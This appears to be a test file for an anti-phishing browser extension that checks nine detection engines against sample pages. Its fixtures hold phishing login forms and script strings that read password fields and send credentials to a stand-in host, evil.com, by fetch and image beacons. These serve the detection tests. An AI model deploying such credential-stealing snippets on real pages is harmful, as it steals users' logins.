import { describe, it, expect, beforeEach } from 'vitest'
import { EngineManager } from '../../src/background/engines'
import type { EngineContext } from '../../src/shared/types/engines'

describe('EngineManager Integration', () => {
  let manager: EngineManager

  beforeEach(() => {
    manager = new EngineManager()
  })

  const createContext = (url: string, overrides?: Partial<EngineContext>): EngineContext => ({
    url,
    domain: new URL(url).hostname,
    hostname: new URL(url).hostname,
    protocol: new URL(url).protocol,
    port: new URL(url).port,
    path: new URL(url).pathname,
    query: new URL(url).search,
    fragment: new URL(url).hash,
    tld: '.' + new URL(url).hostname.split('.').pop(),
    subdomains: [],
    ...overrides
  })

  it('creates all 9 novel engines', () => {
    const engines = manager.getAllEngines()
    expect(engines).toHaveLength(9)
    const engineIds = engines.map(e => e.id)
    expect(engineIds).toContain('credential-canary')
    expect(engineIds).toContain('visual-fingerprint')
    expect(engineIds).toContain('url-entropy')
    expect(engineIds).toContain('css-deception')
    expect(engineIds).toContain('language-matrix')
    expect(engineIds).toContain('script-timeseries')
    expect(engineIds).toContain('certificate-anomaly')
    expect(engineIds).toContain('temporal-clustering')
    expect(engineIds).toContain('interactive-honeypot')
  })

  it('analyzes a safe URL with all engines', async () => {
    const context = createContext('https://www.google.com')
    const results = await manager.analyzeAll(context)
    expect(results).toHaveLength(9)
    results.forEach(result => {
      expect(result.engineId).toBeTruthy()
      expect(typeof result.score).toBe('number')
      expect(typeof result.confidence).toBe('number')
      expect(Array.isArray(result.reasons)).toBe(true)
      expect(typeof result.recommendation).toBe('string')
    })
  })

  it('detects phishing language on suspicious page', async () => {
    const context = createContext('https://secure-login.xyz', {
      html: `
        <html><head><title>Urgent: Your Account Has Been Suspended</title></head>
        <body>
          <h1>Immediate Action Required</h1>
          <p>Your account has been compromised. Please verify your identity immediately.</p>
          <form action="https://evil.com/harvest" method="post">
            <input type="email" name="email" />
            <input type="password" name="password" />
            <button type="submit">Verify Now</button>
          </form>
        </body></html>
      `,
      documentProps: {
        title: 'Urgent: Your Account Has Been Suspended',
        domain: 'secure-login.xyz',
        lastModified: Date.now(),
        referrer: '',
        cookiesEnabled: true
      },
      forms: [{
        action: 'https://evil.com/harvest',
        method: 'post',
        fields: [
          { type: 'email', name: 'email', id: 'email', placeholder: 'Email', isPassword: false, isHidden: false },
          { type: 'password', name: 'password', id: 'pass', placeholder: 'Password', isPassword: true, isHidden: false }
        ],
        hasPassword: true,
        hasSubmit: true,
        actionDomain: 'evil.com',
        isExternal: true
      }]
    })
    const results = await manager.analyzeAll(context)
    const languageResult = results.find(r => r.engineId === 'language-matrix')
    expect(languageResult).toBeDefined()
    expect(languageResult!.score).toBeGreaterThan(0.3)
  })

  it('handles engine enabling/disabling', () => {
    expect(manager.setEngineEnabled('credential-canary', false)).toBe(true)
    const engine = manager.getEngine('credential-canary')
    expect(engine?.enabled).toBe(false)
    expect(manager.setEngineEnabled('nonexistent', false)).toBe(false)
  })

  it('provides engine status', () => {
    const status = manager.getEngineStatus()
    expect(status).toHaveLength(9)
    status.forEach(s => {
      expect(s.id).toBeTruthy()
      expect(s.name).toBeTruthy()
      expect(typeof s.enabled).toBe('boolean')
      expect(typeof s.weight).toBe('number')
    })
  })

  it('detects credential canary patterns', async () => {
    const context = createContext('https://login.example.com', {
      scripts: [
        'document.forms[0].elements; document.querySelectorAll("input"); ' +
        'var pwd = document.getElementById("password").value; ' +
        'fetch("https://evil.com/steal", {method:"POST", body: JSON.stringify({user:u, pass:p})});'
      ],
      forms: [{
        action: 'https://evil-collector.com/harvest.php',
        method: 'post',
        fields: [
          { type: 'email', name: 'email', id: 'email', placeholder: 'Email', isPassword: false, isHidden: false },
          { type: 'password', name: 'password', id: 'pass', placeholder: 'Password', isPassword: true, isHidden: false },
          { type: 'hidden', name: 'token', id: 'token', placeholder: '', isPassword: false, isHidden: true },
          { type: 'hidden', name: 'session', id: 'session', placeholder: '', isPassword: false, isHidden: true }
        ],
        hasPassword: true,
        hasSubmit: true,
        actionDomain: 'evil-collector.com',
        isExternal: true
      }]
    })
    const results = await manager.analyzeAll(context)
    const canaryResult = results.find(r => r.engineId === 'credential-canary')
    expect(canaryResult).toBeDefined()
    expect(canaryResult!.score).toBeGreaterThan(0)
  })

  it('handles empty context gracefully', async () => {
    const context = createContext('https://example.com', {
      html: '',
      forms: [],
      scripts: [],
      links: [],
      iframes: []
    })
    const results = await manager.analyzeAll(context)
    expect(results).toHaveLength(9)
    results.forEach(r => {
      expect(r.error).toBeUndefined()
    })
  })

  it('detects high entropy URLs', async () => {
    const context = createContext('https://a7f3b2c9d1e8.login-secure-xyz.tk/a7f3b2c9d1e8f4a7b3c2/login.php?token=8f7a3b2c9d1e4f5a6b7c8d9e0f1a2b3c4d5e')
    const results = await manager.analyzeAll(context)
    const entropyResult = results.find(r => r.engineId === 'url-entropy')
    expect(entropyResult).toBeDefined()
  })

  it('detects CSS deception patterns', async () => {
    const context = createContext('https://suspicious-site.com', {
      html: `
        <html><head><style>
          .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99999; background: white; }
          .hidden { display: none; }
          .offscreen { text-indent: -9999px; }
        </style></head>
        <body><div class="overlay"></div></body></html>
      `
    })
    const results = await manager.analyzeAll(context)
    const cssResult = results.find(r => r.engineId === 'css-deception')
    expect(cssResult).toBeDefined()
    expect(cssResult!.score).toBeGreaterThan(0)
  })

  it('detects script timeseries patterns', async () => {
    const context = createContext('https://suspicious-site.com', {
      scripts: [
        'window.onload = function() { document.forms[0].action = "https://evil.com/steal"; };',
        'setTimeout(function() { ' +
        '  var p = document.getElementById("password").value; ' +
        '  new Image().src = "https://evil.com/steal?p=" + p; ' +
        '}, 3000);',
        'addEventListener("submit", function(e) { e.preventDefault(); ' +
        '  var data = JSON.stringify({u: user.value, p: pass.value}); ' +
        '  fetch("https://evil.com/steal", {method: "POST", body: data}); ' +
        '});'
      ],
      html: '<html><body><form><input type="password" id="password"/></form></body></html>'
    })
    const results = await manager.analyzeAll(context)
    const scriptResult = results.find(r => r.engineId === 'script-timeseries')
    expect(scriptResult).toBeDefined()
    expect(scriptResult!.score).toBeGreaterThan(0)
  })
})
